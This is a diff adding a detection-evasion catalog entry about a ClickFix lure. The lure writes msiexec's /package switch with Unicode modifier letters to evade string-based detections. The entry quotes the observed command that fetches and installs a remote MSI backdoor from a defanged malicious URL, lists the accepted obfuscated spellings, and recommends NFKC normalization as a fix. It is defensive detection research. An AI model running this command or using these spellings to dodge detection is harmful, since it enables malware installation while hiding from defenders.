@@ -1,0 +1,77 @@
+id: ITW-2026-00001
+title: msiexec /package switch written with Unicode modifier letters
+related_ade:
+  - ADE1-01  # Reformatting in Actions – Substring Manipulation
+schema_version: 1.0
+technique_description: >
+  The command delivered through a ClickFix lure runs msiexec with the /package
+  switch written as "/PᵃᶜkAᵍe". Three of its letters are replaced by Unicode
+  modifier letters that render as small raised versions of the same letters.
+  Windows Installer accepts the altered switch as /package and installs the
+  remote MSI, while detections that match the literal string "/package" or
+  "-package" in the command line do not match.
+observed_command: |
+  msiexec /PᵃᶜkAᵍe "http://usaclodconfig[.]net\lnegraverif.php?ver=<id>" -Q
+character_substitutions:
+  - "a -> U+1D43 MODIFIER LETTER SMALL A (ᵃ)"
+  - "c -> U+1D9C MODIFIER LETTER SMALL C (ᶜ)"
+  - "g -> U+1D4D MODIFIER LETTER SMALL G (ᵍ)"
+assumption_violated: >
+  The detection assumes the msiexec install switch reaches the command line in
+  one of its documented ASCII spellings, and that msiexec rejects every other
+  spelling. msiexec also accepts Unicode modifier-letter forms of the switch,
+  so the set of working spellings is larger than the set of strings the rule
+  matches.
+observed:
+  malware_family: Azure30 (Node.js backdoor delivered as a trojanized MSI)
+  actor: unattributed
+  delivery: ClickFix lure (malicious copy and paste)
+  first_reported: 2026-10-09
+  sources:
+    - title: "“Azure30” Node.js Backdoor Delivered by a Trojanized MSI"
+      publisher: ThreatHunter.ai
+      authors: James McMurry, Ivan Wike (1MC-Labs)
+      report_id: CVR-2026-1008-01
+      url: https://www.threathunter.ai/blog/azure30-nodejs-backdoor-trojanized-msi-clickfix/
+reproduction:
+  status: confirmed
+  date: 2026-10-29
+  environment: Windows 11 Pro 10.0.26300
+  method: >
+    Ran msiexec.exe with each switch spelling against a nonexistent local
+    package and /qn, then read the exit code. 1619
+    (ERROR_INSTALL_PACKAGE_OPEN_FAILED) means the switch was parsed as an
+    install and msiexec tried to open the package. 1639
+    (ERROR_INVALID_COMMAND_LINE) means the switch was rejected.
+  results:
+    - spelling: "/package"
+      exit_code: 1619
+    - spelling: "/PᵃᶜkAᵍe"  # observed in the wild
+      exit_code: 1619
+    - spelling: "/ᵖᵃᶜᵏᵃᵍᵉ"  # every letter a modifier letter
+      exit_code: 1619
+    - spelling: "/ｐａｃｋａｇｅ"  # fullwidth letters (U+FF41-FF5A)
+      exit_code: 1639
+    - spelling: "/ⁱ"  # U+2071 SUPERSCRIPT LATIN SMALL LETTER I for /i
+      exit_code: 1639
+    - spelling: "/Pxckage"  # control
+      exit_code: 1639
+related_dle: []
+logsource:
+  product: windows
+  category: process_creation
+mitre_attack:
+  - T1218.007  # System Binary Proxy Execution: Msiexec
+  - T1027.010  # Obfuscated Files or Information: Command Obfuscation
+credit: ADE Maintainers
+notes: >
+  The source report states that Windows accepts the switch but does not
+  describe a test; the reproduction above confirms it. Sigma's windash
+  modifier expands the leading "-" or "/" into other dash characters but
+  leaves the letters alone, so a rule matching "-package" with windash still
+  misses this spelling. msiexec does not accept every Unicode compatibility
+  form (fullwidth letters were rejected), but NFKC normalization maps every
+  spelling found to work so far back to ASCII, so normalizing the command line
+  with NFKC and matching case-insensitively closes this variant. Detections
+  anchored on what the attacker cannot change, such as msiexec fetching a
+  package over HTTP(S), are not affected by how the switch is spelled.
